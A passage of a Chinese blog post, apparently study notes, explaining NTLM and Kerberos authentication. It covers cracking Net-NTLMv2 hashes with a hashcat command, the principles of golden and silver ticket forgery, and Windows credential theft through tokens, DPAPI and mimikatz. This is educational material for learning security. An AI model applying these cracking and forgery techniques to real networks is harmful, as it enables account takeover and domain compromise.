hash 、 Net-NTLM v2 hash ，具体区别就是加密方式不同</p><p>在 NTLM 认证中， NTLM 响应分为 NTLM v1 ， NTLMv2 ， NTLM session v2 三种协议，不同协议使用不同格式的 Challenge  和加密算法</p><h3 id="2、质询"><a href="#2、质询" class="headerlink" title="2、质询"></a>2、质询</h3><p>挑战（Chalenge）&#x2F; 响应（Response）认证机制的核心</p><ol><li>客户端向服务器端发送用户信息(仅有用户名)请求</li><li>服务器接受到请求后，判断本地用户列表是否存在客户端发送的用户名，如果没有返回认证失败，如果有，生成一个16位的随机数，被称之为” Challenge “， 然后使用登录用户名对应的 NTLM Hash 加密Challenge(16位随机字符)， 生成 Challenge1 保存在内存中。同时，生成 Challenge1后，将 Challenge (16位随机字符)明文发送给客户端。</li><li>客户端接受到 Challenge 后，使用自己提供的账户的密码转换成对应的 NTLM Hash ，然后使用这个 NTLM Hash 加密 Challenge 生成 Response ，然后将 Response 发送至服务器端。</li></ol><blockquote><p>经过 NTLM Hash加密 Challenge的结果在网络协议中称之为 Net NTLM Hash</p></blockquote><h3 id="3、验证"><a href="#3、验证" class="headerlink" title="3、验证"></a>3、验证</h3><p>在质询完成后，验证结果，是认证的最后一步。<br>服务端收到客户端发送的 Response 后，与之前保存在内存中的 Channelge1 比较，如果相等认证通过</p><p>其中，经过 NTLM Hash 加密 Challenge 的结果在网络协议中称之为 <strong>Net NTLM Hash</strong> （但是呢 我们不直接用来进行哈希传递攻击，可以通过<strong>暴力破解来获取明文密码</strong>）</p><blockquote><p>hash传递攻击：在讲到pth（pass the hash）的时候会讲到</p></blockquote><p>其中的关键点在于：第二步质询的操作中客户端发送给服务端的是 <strong>NTLM  哈希值与随机字符串加密的结果</strong>Response，而这个 <u>NTLM  哈希是由用户输入的密码本地计算得出的</u>，所以在这个步骤中，只要能提供正确的 NTLM  哈希即使不知道正确的密码也可通过认证!!</p><h3 id="Net-NTLM-Hash的破解"><a href="#Net-NTLM-Hash的破解" class="headerlink" title="Net NTLM Hash的破解"></a>Net NTLM Hash的破解</h3><p>需要用到hash密码破解的神器——hashcat，支持破解的协议非常的多</p><blockquote><p><a href="https://hashcat.net/wiki/doku.php">https://hashcat.net/wiki/doku.php</a>?</p><p>Hashcat的使用手册总结：<a href="https://xz.aliyun.com/t/4008">https://xz.aliyun.com/t/4008</a></p></blockquote><p>下面使常见的参数，想了解更多的参数可以hashcat –help查看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-a  指定要使用的破解模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。</span><br><span class="line">-m  指定要破解的hash类型，如果不指定类型，则默认是MD5</span><br><span class="line">-o  指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中</span><br><span class="line">--force 忽略破解过程中的警告信息,跑单条hash可能需要加上此选项</span><br><span class="line">--show  显示已经破解的hash及该hash所对应的明文</span><br><span class="line">--increment  启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程</span><br><span class="line">--increment-min  密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用</span><br><span class="line">--increment-max  密码最大长度,同上</span><br><span class="line">--outfile-format 指定破解结果的输出格式id,默认是3</span><br><span class="line">--username   忽略hash文件中的指定的用户名,在破解linux系统用户密码hash可能会用到</span><br><span class="line">--remove     删除已被破解成功的hash</span><br><span class="line">-r       使用自定义破解规则</span><br></pre></td></tr></table></figure><p>NTLMv2的格式为：  </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username::domain:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 5600 net-ntlm /tmp/password.list -o found.txt --force</span><br><span class="line">-m：hash-type即hash使用的协议，5600对应的是NetNTLMv2。详细支持的协议的参数可查表</span><br><span class="line">-o：输出文件 字典文件为/tmp/password.list</span><br><span class="line">--force：代表强制执行，测试系统不支持Intel OpenCL</span><br></pre></td></tr></table></figure><h2 id="域认证"><a href="#域认证" class="headerlink" title="域认证"></a>域认证</h2><p>在我看来，域认证：域内一台主机向另一台主机（server）发起请求，但是呢，我们身份的校验是在DC上，DC上面的ntds.dit数据库存储了域内所有主机的账号秘密hash，当我们身份在DC上通过校验时才能拿到访问server的方式~~。</p><h3 id="Kerberos简单介绍"><a href="#Kerberos简单介绍" class="headerlink" title="Kerberos简单介绍"></a>Kerberos简单介绍</h3><ul><li>Kerberos是一种网络认证协议，其设计目标是通过密钥系统为客户机&#x2F;服务器应用程序提供强大的认证服务。</li><li>该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。全部的操作都交由DC，DC允许你可以访问，你就不可以访问，不然的话，怎么都是不许的（霸道总裁</li><li>在以上情况下，Kerberos作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的。</li></ul><p>域内认证即采用了Kerberos协议的认证机制，与前两者相比最大的区别是有个一个可信的第三方机构KDC的参与。</p><p>参与域认证的三个角色：</p><blockquote><ul><li><p>Client</p></li><li><p>Server</p></li><li><p>KDC(Key Distribution Center) &#x3D; DC(Domain Controller) &#x3D; AD（Account Database）+ AS（Authenication Service）+ TGS（Ticket Granting Service）</p><p><strong>从物理层面看，AD与AS，TGS，KDC均为域控制器(Domain Controller)。</strong></p></li></ul></blockquote><h3 id="Kerberos认证协议及域相关知识的基础概念"><a href="#Kerberos认证协议及域相关知识的基础概念" class="headerlink" title="Kerberos认证协议及域相关知识的基础概念"></a>Kerberos认证协议及域相关知识的基础概念</h3><ul><li>活动目录：</li></ul><p>活动目录AD：Active Diretory，是指域环境中提供目录服务的组件。目录用于存储有关<strong>网络对象</strong>（例如用户、组、计算机、共享资源、打印机和联系人等)的<strong>信息</strong>。能够快速、准确的从目录中找到其所需的信息的服务，为企业提供了网络环境集中式管理的机制。</p><p>活动目录主要的功能：</p><blockquote><ul><li>账号集中管理：所有的账户都存储在服务器中，可以方便快捷的<strong>执行命令和管理密码</strong>等。</li><li>软件集中管理：能够统一推送软件，安装网络打印机等服务器</li><li>环境集中管理：统一客户端桌面、IE等</li><li>增强安全性：统一部署杀软，统一执行病毒扫描任务、集中管理用户的计算机权限，统一指定密码策略。</li><li>更加的可靠更短的宕机时间</li></ul></blockquote><p>在域中，网络对象可以相互访问，但是在真实情况中，需要对某些部门的计算机进行限制，例如：销售部门不能访问技术部门的服务器。这个中间就需要Kerberos认证协议来验证网络对象间的权限。</p><ul><li><p>票据(Ticket)：是网络对象<strong>互相访问</strong>的凭证。可以比喻为车票</p></li><li><p>TGT(Ticket Granting Ticket)：看英文名就知道 票据生成&#x2F;授予票据，用来生成Ticket的Ticket。就是生成网络对象之间访问的票据所需要的票据。如果将我们最终生成的网络对象之间访问的票据比喻为我们的火车票，那么TGT就是我们购买车票时验证我们身份的身份证~~另外，TGT在TGS上生成我们的最终Ticket！此时，我们的TGS就可以比喻为我们的售票机~，用来生成车票（ticket）。</p><p>由身份认证服务（AS）授予的票据(<strong>黄金票据</strong>)，用于身份认证，存储在内存，默认有效期为10小时。也就是这张在域内的身份证有效期只有十个小时</p></li><li><p>AD(Account Database)：存储域中所有用户的用户名和对应的NTLM Hash，可以理解为域中的SAM数据库，KDC可以从AD中提取域中所有用户的NTLM Hash，这是Kerberos协议能够成功实现的基础。</p></li><li><p>KDC(Key Distribution Center)：密钥分发中心，负责管理票据、认证票据、分发票据，里面包含两个服务：AS和TGS</p></li></ul><blockquote><p>KDC 提供两个核心服务:</p><ul><li>身份验证服务(AS - Authentication Server)：对Client进行身份验证并且向Client生成和发出TGT票证的服务，，也用来完成对Client的身份验证;前面将TGT比喻为身份证，那么AS对Client身份进行认证，自然就是兼饰“公安局”的角色，对Client(身份证)进行办法TGT（身份证）确认其身份~~~</li><li>票证授予&#x2F;生成服务(TGS - Ticket Granting Server)：接受经过身份验证的客户机并向其发出票证以访问其他资源。为Client生成允许对某个服务访问的ticket，就是Client从AS那里拿到TGT之后，来TGS这里再申请对某个特定服务或服务器访问的Ticket，只有获取到这个Ticket，Client才有权限去访问对应的服务，该服务提供的票据也称为 Ticket 或者叫<strong>白银票据</strong>。比喻为售票机，用来生成车票Ticket~~</li></ul></blockquote><h4 id="注意下面几点："><a href="#注意下面几点：" class="headerlink" title="注意下面几点："></a>注意下面几点：</h4><ul><li>Client 密钥 、TGS密钥 和 Service 密钥 均为对应用户的NTLM Hash，用对应用户的NTML hash加密DC和对应用户之间的交互信息~~后面会提到</li></ul><blockquote><ul><li>TGS密钥 &#x3D;&#x3D; KDC Hash &#x3D;&#x3D; krbtgt用户的NTLM Hash</li></ul><blockquote><p>krbtgt用户是域控独有用户，我们无法直接登录该用户，但该用户也有NTLM hash，kerberos认证时会用到</p></blockquote><ul><li>关于Service Hash</li></ul><blockquote><p>Service Hash其实是目标中一个用户名与hostname相同的用户的Hash 。如hostname为PC-WIN7的服务器，对应的Hash就是Username : PC-WIN7$的哈希。</p><p>service hash也是存储在域控之中~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141410834.png" alt="image-20220809172642251" style="zoom:50%;" /><p>再比如这个WEB$机器</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208232335629.png" alt="image-20220823233540388"></p></blockquote></blockquote><ul><li>Server 和 Service可以当作一个东西，就是Client想要访问的服务器或者服务</li><li>注意区分（Client&#x2F;TGS&#x2F;Server) Sessionkey和（Client&#x2F;TGS&#x2F;Service)密钥：</li></ul><blockquote><ul><li>（Client&#x2F;TGS&#x2F;Server) Sessionkey  ： 可以看作客户端与TGS服务和尝试登陆的Server之间会话时用来加密的<strong>密钥</strong>，</li><li>（Client&#x2F;TGS&#x2F;Service)密钥：(上面提到的三个实际为NTLM Hash的密钥)，是用来加密会话<strong>密钥的密钥</strong>，为了保证会话密钥的传输安全，这些加密方式均为对称加密。</li></ul><blockquote><p>参与认证的三个角色的 NTLM Hash  是三个密钥，这三个NTLM Hash的唯一作用是确保会话密钥 Sessionkey  的安全传输</p></blockquote><p><u>仔细体会上述两者的区别，一个是密钥，一个是加密密钥的密钥~~</u></p></blockquote><h3 id="Kerbreros认证流程"><a href="#Kerbreros认证流程" class="headerlink" title="Kerbreros认证流程"></a>Kerbreros认证流程</h3><p>Client向KDC发起服务请求，希望获取访问Server的权限。 KDC得到了这个消息，首先得判断Client是否是可信赖的， 也就是从AD数据库中寻找该用户是否可用来登录。这就是AS服务完成的工作，成功后，AS返回TGT给Client。</p><p>Client得到了TGT后，继续向KDC请求，希望获取访问Server的权限。KDC又得到了这个消息，这时候通过Client 消息中的TGT，判断出了Client拥有了这个权限，给了Client访问Server的权限Ticket。（TGS服务的任务）</p><p>Client得到Ticket后便可以使用这个Ticket成功访问Server。但是这个Ticket只能用来访问这个Server，如果要访问其他Server需要向KDC重新申请。</p><p>下图综述了Kerberos认证过程~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355638.png" alt="image-20220809164958412" style="zoom:50%;" /><p>接下来详细讲讲每一小步</p><h4 id="1-用户登录"><a href="#1-用户登录" class="headerlink" title="1. 用户登录"></a>1. 用户登录</h4><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355621.png" alt="image-20220809165025241" style="zoom: 33%;" /><ul><li>用户输入 [用户名] 和 [密码] 信息</li><li>在客户端，用户输入的 [密码] 通过计算生成NTLM哈希作做为 [Client密钥]</li></ul><h4 id="2-请求身份认证（与AS校验）"><a href="#2-请求身份认证（与AS校验）" class="headerlink" title="2. 请求身份认证（与AS校验）"></a>2. 请求身份认证（与AS校验）</h4><h5 id="2-1-客户端向AS-身份认证服务-发送认证请求"><a href="#2-1-客户端向AS-身份认证服务-发送认证请求" class="headerlink" title="2.1 客户端向AS(身份认证服务)发送认证请求"></a>2.1 客户端向AS(身份认证服务)发送认证请求</h5><p>客户端向AS发送认证请求，请求中带有明文的 [用户名] 信息</p><blockquote><p>此时并未发送[密码]或[密钥]信息</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355763.png" alt="image-20220809171208401" style="zoom: 33%;" /><h5 id="2-2-AS确认Client端登录者用户身份"><a href="#2-2-AS确认Client端登录者用户身份" class="headerlink" title="2.2 AS确认Client端登录者用户身份"></a>2.2 AS确认Client端登录者用户身份</h5><ol><li><p>AS收到用户认证请求之后，根据请求中的 [用户名] 信息，从AD数据库(account database)中查找该用户名是否存在。</p></li><li><p>如果 用户名 存在，则根据该用户名提取NTLM Hash做为AS生成的 [<strong>CLIENT 密钥</strong>]，如果第1步中用户提供的 密码 信息正确，并与该用户登录中的 [CLIENT密钥] 是相等的，则进行下一步。</p></li></ol><blockquote><p>注意哦，两次生成的[<strong>CLIENT 密钥</strong>]是不一样的，一个是AS通过调用域控上面存储的对应用户NTML Hash生成的密钥，一个是用户自己登录成功自动生成的[<strong>CLIENT 密钥</strong>]。只有两个密钥相同才认可其身份，这一步基本上就是和上面提到的Windows网络认证基本类似~~</p><p>并且要注意到，第一步只发送了用户名，并未发送密码，所以在AS这边仅仅只做了一个检验该用户身份是否存在的过程，并没有验证其密码是否正确，比对两个[<strong>CLIENT 密钥</strong>]是在哪里发生的呢？是在AS响应的包中，这样操作的意思就是：如果该用户的密码是正确的用户密码，那么他自然可以解开我包中所传递的 [Client&#x2F;TGS SessionKey]~~~这个过程也就是解密AS响应消息中Msg A的过程。Client只有用户密码对了，才能从Msg A中拿到 [Client&#x2F;TGS SessionKey]！！！我们只有拿到了 [Client&#x2F;TGS SessionKey]，才能保证后门和TGS会话的正常！！！！！！！！</p></blockquote><ol start="3"><li>AS为Client响应如下消息：</li></ol><ul><li><p>Msg A 使用 KDC生成的[CLIENT密钥] 加密的 [Client&#x2F;TGS SessionKey]，Client是可以那自己在第一步生成的[CLIENT密钥] 对之解密，拿出 [Client&#x2F;TGS SessionKey]~~~</p></li><li><p>Msg B 使用 [TGS密钥] 加密的TGT，客户端没有KDC NTLM Hash因此Client无法解密TGT。Client仅能持有TGT，拿着TGT再去找TGS要ticket，这是后话</p><p>TGT中包含如下信息：</p></li></ul><blockquote><ul><li>[Client&#x2F;TGS SessionKey]</li><li>Client ID</li><li>Ticket有效时间</li><li>CLient 地址</li></ul></blockquote><ol start="4"><li>Client收到AS的响应消息以后，利用自身的 CLIENT密钥 可以对Msg A进行解密，这样可以获取到 [Client&#x2F;TGS SessionKey] 。但由于Msg B是使用 TGS密钥 加密的，Client无法对其解密。</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355688.png" alt="image-20220809171642114" style="zoom: 33%;" /><blockquote><ul><li>AS响应的消息中有一条是属于Client的，但另外一条却属于TGS。</li><li>Client&#x2F;TGS SessionKey出现了两个Copy，一个给Client端，一个给TGS端。</li><li>认证过程中的加密除哈希外均采用的是对称加密算法</li></ul></blockquote><p>下面图片概述了AS返回的内容~~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355771.png" alt="image-20220809171311572" style="zoom: 50%;" /><h4 id="3-请求服务授权"><a href="#3-请求服务授权" class="headerlink" title="3. 请求服务授权"></a>3. 请求服务授权</h4><h5 id="3-1-客户端向TGS发送请求服务授权请求"><a href="#3-1-客户端向TGS发送请求服务授权请求" class="headerlink" title="3.1 客户端向TGS发送请求服务授权请求"></a>3.1 客户端向TGS发送请求服务授权请求</h5><p>下图概述了Client向TGS发送的内容：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355676.png" alt="image-20220809171738168" style="zoom:50%;" /><p>客户端发送的请求中包含如下两个消息：</p><ul><li>Msg C</li></ul><blockquote><ul><li>要请求的服务ID, 即[Service ID]</li><li>上一步2.2中由AS为Client提供的TGT</li></ul></blockquote><ul><li>Msg D</li></ul><blockquote><p>使用 [Client&#x2F;TGS SessionKey] 加密的Authenticator 1 {Client ID, Timestamp}</p></blockquote><h5 id="3-2-TGS为Client响应服务授权票据"><a href="#3-2-TGS为Client响应服务授权票据" class="headerlink" title="3.2 TGS为Client响应服务授权票据"></a>3.2 TGS为Client响应服务授权票据</h5><h6 id="TGS在响应之前会先解开请求内容："><a href="#TGS在响应之前会先解开请求内容：" class="headerlink" title="TGS在响应之前会先解开请求内容："></a>TGS在响应之前会先解开请求内容：</h6><p>KDC接收到TGT与其他内容后，会首先使用KDC 的NTLM Hash解密TGT，只有KDC可以解密TGT，从TGT中提取到 [Client&#x2F;TGS SessionKey] ，再使用 [Client&#x2F;TGS SessionKey] 解密Authenticator 1，获取到{Client ID, timestamp} 并与通过解密TGT获取到的{Client ID, 有效时间}进行对比，通过则继续响应。如下图</p><blockquote><ul><li>TGT中包含如下信息：</li></ul><blockquote><ul><li>[Client&#x2F;TGS SessionKey]</li><li>Client ID</li><li>Ticket有效时间</li><li>CLient 地址</li></ul></blockquote><p>所以TGT中携带了Client ID以及timestamp~~可以与Msg D中的Authenticator 1 {Client ID, Timestamp}进行对比</p><ul><li>实际上在这个对比Authenticator 1 {Client ID, Timestamp}是否有效的过程，这种认证是双向的，不仅仅是检验了客户端是否是“对的人”，也默认的对KGS端进行了验证~</li></ul><blockquote><p>因为只有KDC 的NTLM Hash对了，才能解密出[Client&#x2F;TGS SessionKey]，才能拿到Authenticator 1</p></blockquote></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355646.png" alt="image-20220809171856218" style="zoom: 33%;" /><h6 id="TGS为Client响应的消息包括："><a href="#TGS为Client响应的消息包括：" class="headerlink" title="TGS为Client响应的消息包括："></a>TGS为Client响应的消息包括：</h6><ul><li>Msg E 使用 [SERVICE密钥] (服务器的NTLM HASH) 加密的 CLIENT-TO-SERVER TICKET , 该Ticket中包含了如下信息:</li></ul><blockquote><ul><li>[Client&#x2F;Server SessionKey]</li><li>Client网络地址</li><li>Ticket有效时间</li><li>Client ID</li></ul></blockquote><p>注意，关于Msg E</p><blockquote><p> CLIENT-TO-SERVER TICKET是TGS授予的允许访问票据，但是client无法解密，只有server拿到手后，通过 [SERVICE密钥] 才能解密，以此来确认身份！！！！！</p></blockquote><ul><li>Msg F 使用[Client&#x2F;TGS SessionKey] 加密的 [Client&#x2F;Server SessionKey] 。</li></ul><blockquote><ul><li>Msg F使用了 [Client&#x2F;TGS SessionKey] 加密，因此，该消息对Client可见。Client对其解密以后可获取到 [Client&#x2F;Server SessionKey] 。</li><li>而Msg E使用了 [SERVICE密钥] 加密，该消息可视作是TGS给Service Server的消息，只不过由Client一起携带发送给Service Server</li></ul></blockquote><p>下图为TGS响应消息概览：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355594.png" alt="image-20220809171942456" style="zoom:50%;" /><h4 id="4-发送服务请求"><a href="#4-发送服务请求" class="headerlink" title="4. 发送服务请求"></a>4. 发送服务请求</h4><h5 id="4-1-Client向Service-Server发送服务请求"><a href="#4-1-Client向Service-Server发送服务请求" class="headerlink" title="4.1 Client向Service Server发送服务请求"></a>4.1 Client向Service Server发送服务请求</h5><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355685.png" alt="image-20220809172116925" style="zoom:50%;" /><p>发送的消息中包括：</p><ul><li><strong>Msg E</strong> 上一步3.2中，TGS为Client响应的消息Msg E。该消息可以理解为由Client携带的消息。</li></ul><blockquote><ul><li>Msg E 使用 [SERVICE密钥] (服务器的NTLM HASH) 加密的 CLIENT-TO-SERVER TICKET , 该Ticket中包含了如下信息:</li></ul><blockquote><ul><li>[Client&#x2F;Server SessionKey]</li><li>Client网络地址</li><li>Ticket有效时间</li><li>Client ID</li></ul></blockquote></blockquote><ul><li><strong>Msg G</strong> 由[Client&#x2F;Server SessionKey]加密的Authenticator 2，包含{Client ID, Timestamp}信息。</li></ul><blockquote><ol><li>[Client&#x2F;Server SessionKey] 并非直接传输，而是被包含在使用[Service密钥]加密的Msg E中。</li><li>既然 [Client&#x2F;Server SessionKey] 并不直接明文传输， Client需要向Service Server证明自己拥有正确的 [Client&#x2F;Server SessionKey] ，所以，Authenticator 2使用了 [Client&#x2F;Server SessionKey] 加密。</li></ol></blockquote><h5 id="4-2-SS响应Client"><a href="#4-2-SS响应Client" class="headerlink" title="4.2 SS响应Client"></a>4.2 SS响应Client</h5><ol><li>SS收到客户端的服务请求之后，先利用自身的 [SERVICE密钥] 对Msg E进行解密，提取出Client-To-Server Ticket, 在3.2步骤中，提到了该Ticket中包含了 [Client&#x2F;Server SessionKey] 以及Client ID信息。</li><li>SS使用 [Client&#x2F;Server SessionKey] 解密Msg G，提取Client ID信息，而后将该Client ID与Client-To-Server Ticket中的Client ID进行比对，如果匹配则说明Client拥有正确的 [Client&#x2F;Server SessionKey] 。</li><li>而后，SS向Client响应Msg H(包含使用 [Client&#x2F;Server SessionKey] 加密的Timestamp信息)。</li><li>Client收到SS的响应消息Msg H之后，再使用[Client&#x2F;Server SessionKey] 对其解密，提取Timestamp信息，然后确认该信息与Client发送的Authenticator 2中的Timestamp信息一致。</li></ol><p>如上信息可以看出来，该交互过程起到了Client与SS之间的“双向认证”作用。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355614.png" alt="image-20220809172331198" style="zoom:50%;" /><h3 id="kerberos参考"><a href="#kerberos参考" class="headerlink" title="kerberos参考"></a>kerberos参考</h3><blockquote><ul><li><a href="https://www.roguelynn.com/words/explain-like-im-5-kerberos/">解释像我5：Kerberos – roguelynn</a></li><li>【kerberos协议认证流程详解-哔哩哔哩】 <a href="https://b23.tv/zgPYbXB">https://b23.tv/zgPYbXB</a></li><li><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961976(v=technet.10)?redirectedfrom=MSDN">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961976(v=technet.10)?redirectedfrom=MSDN</a></li><li><a href="https://www.cnblogs.com/huamingao/p/7267423.html">https://www.cnblogs.com/huamingao/p/7267423.html</a></li><li><a href="https://www.cnblogs.com/zpchcbd/p/11707302.html">Kerberos身份验证流程 - zpchcbd - 博客园 (cnblogs.com)</a>！！！！讲的好！！！</li><li><a href="https://juejin.cn/post/6945435504905027598">盘点认证协议 : 普及篇之Kerberos</a>（本文讲的也很不错~~极好）</li></ul></blockquote><h3 id="票据伪造的原理"><a href="#票据伪造的原理" class="headerlink" title="票据伪造的原理"></a>票据伪造的原理</h3><blockquote><p>注：如果难理解黄金票据TGT和白云票据Ticket的伪造原理。那么就请将3.1和4.1两次Client发起的请求做一个对比~~可能就懂了，注意对比两次请求中携带的信息。。注意到TGT和Ticket都是KDC颁发给client的（附带在KDC响应client的包中），但是client并不持有解密密钥，client仅能当“工具人”，仅能持有票据交给TGS和server去打开它~</p><ul><li>3.1Client请求TGS时，携带了：</li></ul><blockquote><ul><li>Msg C</li></ul><blockquote><ul><li>要请求的服务ID, 即[Service ID]</li><li>上一步2.2中由AS为Client提供的使用 [TGS密钥] 加密的TGT</li></ul><blockquote><p>TGT中包含如下信息：</p><blockquote><ul><li>[Client&#x2F;TGS SessionKey]</li><li>Client ID</li><li>Ticket有效时间</li><li>CLient 地址</li></ul></blockquote></blockquote></blockquote><ul><li>Msg D</li></ul><blockquote><p>使用 [Client&#x2F;TGS SessionKey] 加密的Authenticator 1 {Client ID, Timestamp}</p></blockquote></blockquote><ul><li>4.1Client请求server时，携带了：</li></ul><blockquote><ul><li><strong>Msg E</strong> 上一步3.2中，TGS为Client响应的消息Msg E。该消息可以理解为由Client携带的消息。</li></ul><blockquote><ul><li>Msg E 使用 [SERVICE密钥] (服务器的NTLM HASH) 加密的 CLIENT-TO-SERVER TICKET , 该Ticket中包含了如下信息:</li></ul><blockquote><ul><li>[Client&#x2F;Server SessionKey]</li><li>Client网络地址</li><li>Ticket有效时间</li><li>Client ID</li></ul></blockquote></blockquote><ul><li><strong>Msg G</strong> 由[Client&#x2F;Server SessionKey]加密的Authenticator 2，包含{Client ID, Timestamp}信息。</li></ul></blockquote></blockquote><ul><li>2.2 AS确认Client端登录者用户身份</li></ul><p>KDC返回的Msg B：使用  [TGS密钥] 加密的TGT，当<strong>我们获取到krbtgt用户的NTLM哈希后</strong>，便可主动使用krbtgt用户的NTLM哈希做为TGS密钥来生成TGT发送给KDC，这样KDC如果通过解密伪造TGT获取到伪造的 [CLIENT&#x2F;TGS SESSIONKEY] 可以成功解密 Authenticator 1 并完成与TGT中的数据进行比对，便成功骗过了KDC，也就是成功伪造了黄金票据（TGT便是黄金票据）</p><blockquote><p>简而言之便是：我们通过伪造的 [TGS密钥] 生成TGT，发送给KDC，来骗取其响应中的和TGS通信的 [CLIENT&#x2F;TGS SESSIONKEY]，并凭借此sessionkey在3.1中伪造成一个正常用户继续向KGS发起请求~~~</p><p>理解的关键在于：在AS返回Client的消息中，有一个Msg B 使用 [TGS密钥] 加密的TGT，Msg B虽然是Client接受，但无法解密，这个东西是他要拿着去带给TGS证明自己身份的~也就是说，如果我们在3.1向TGS请求过程中，携带的Msg B 可以用[TGS密钥] 解密，那就证明了我们的身份（证明我们是正常用户）。</p><p>但是，不凑巧的是，我们破获了 [TGS密钥]，这就是黄金票据的原理~</p></blockquote><ul><li>4.1 Client向SS(Service Server)发送服务请求</li></ul><p>客户端向服务器发送的为使用 SERVICE密钥(服务器的NTLMHASH) 加密的 CLIENT-TO-SERVER TICKET ，在Ticket中包含用来供服务器解密Authenticator 2的 CLIENT&#x2F;SERVER SESSIONKEY 。<strong>如果获取到了Service Server的NTLM</strong><br><strong>Hash</strong>，便可伪造Ticket，和Authenticator 2 ，Service Server在接收到Ticket和Authenticator 2后可以使用自己的NTLM Hash正常解密完成比对，也就是成功伪造了白银票据（访问服务的Ticket即为白银票据）</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><ul><li><a href="https://xz.aliyun.com/t/1943">Windows下的密码hash——NTLM hash和Net-NTLM hash介绍</a></li><li><a href="https://payloads.online/archivers/2018-11-30/1/">彻底理解Windows认证 - 议题解读 « 倾旋的博客</a></li><li><a href="https://link.zhihu.com/?target=http://wikipedia.moesalih.com/NTLM">NT LAN Manager</a></li><li><a href="https://link.zhihu.com/?target=http://www.voidcn.com/article/p-voxshmho-sn.html">NTLM 协议</a></li><li><a href="https://link.zhihu.com/?target=https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/">Windows下的密码hash——NTLM hash和Net-NTLM hash介绍</a></li></ul></blockquote><h1 id="Windows密码凭证获取"><a href="#Windows密码凭证获取" class="headerlink" title="Windows密码凭证获取"></a>Windows密码凭证获取</h1><p>Windows的密码一般存在syskey加密过后的系统文件中（SAM文件）或者是注册表中</p><h2 id="Token窃取与利用"><a href="#Token窃取与利用" class="headerlink" title="Token窃取与利用"></a>Token窃取与利用</h2><p>Windows有两种类型的token：</p><ul><li>Delegation Token（授权令牌）:用来交互会话（用户直接登录，远程桌面登录）</li><li>Impresonation Token（模拟令牌）：用于非交互登录（利用net user访问共享文件夹）</li></ul><p>两种token只在系统注销重启后清除</p><p>具有Delegation Token的用户在注销后，该token将变成impersonation token，依旧有效。</p><h2 id="DPAPI"><a href="#DPAPI" class="headerlink" title="DPAPI"></a>DPAPI</h2><blockquote><p>通过Dpapi获取Windows身份凭证<a href="https://xz.aliyun.com/t/6508">https://xz.aliyun.com/t/6508</a></p><p>Mimikatz之DPAPI学习与实践<a href="https://zhuanlan.zhihu.com/p/43888078">https://zhuanlan.zhihu.com/p/43888078</a></p></blockquote><h3 id="Dpapi简述"><a href="#Dpapi简述" class="headerlink" title="Dpapi简述"></a>Dpapi简述</h3><p>从Windows 2000开始，Microsoft随操作系统一起提供了一种特殊的数据保护接口，称为Data Protection Application Programming Interface（DPAPI）。其分别提供了加密函数CryptProtectData 与解密函数 CryptUnprotectData 以用作敏感信息的加密解密。</p><p>其用作范围包括且不限于：</p><ul><li>IE、Chrome的登录表单自动完成</li><li>Powershell加密函数</li><li>Outlook, Windows Mail, Windows Mail, 等邮箱客户端的用户密码。</li><li>FTP管理账户密码</li><li>共享资源文件夹的访问密码</li><li>无线网络帐户密钥和密码</li><li>远程桌面身份凭证</li><li>EFS</li><li>EAP&#x2F;TLS 和 802.1x的身份凭证</li><li>Credential Manager中的数据</li><li>以及各种调用了CryptProtectData函数加密数据的第三方应用，如Skype, Windows Rights Management Services, Windows Media, MSN messenger, Google Talk等。</li><li>etc</li></ul><p>由于功能需求，Dpapi采用的加密类型为对称加密，所以只要找到了密钥(Master Key )，就能解开物理存储的加密信息了。</p><h3 id="Master-Key-Files"><a href="#Master-Key-Files" class="headerlink" title="Master Key Files"></a>Master Key Files</h3><p>存放密钥的文件则被称之为<code>Master Key Files</code>，其路径一般为<code>%APPDATA%/Microsoft/Protect/%SID%</code>。而这个文件中的密钥实际上是<strong>随机64位字节码经过用户密码等信息的加密后的密文</strong>，所以只需要有用户的明文密码&#x2F;Ntlm&#x2F;Sha1就可以还原了。</p><h2 id="系统用户凭证获取"><a href="#系统用户凭证获取" class="headerlink" title="系统用户凭证获取"></a>系统用户凭证获取</h2><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><ul><li><strong>win7和win10mimikatz的使用会存在区别</strong></li><li>要有管理员权限 普通用户无法获取密码</li><li>mimikatz原理就是从系统lsass.exe进程中获取明文密码或者hash，得要用户登录才能从中获取</li></ul><h4 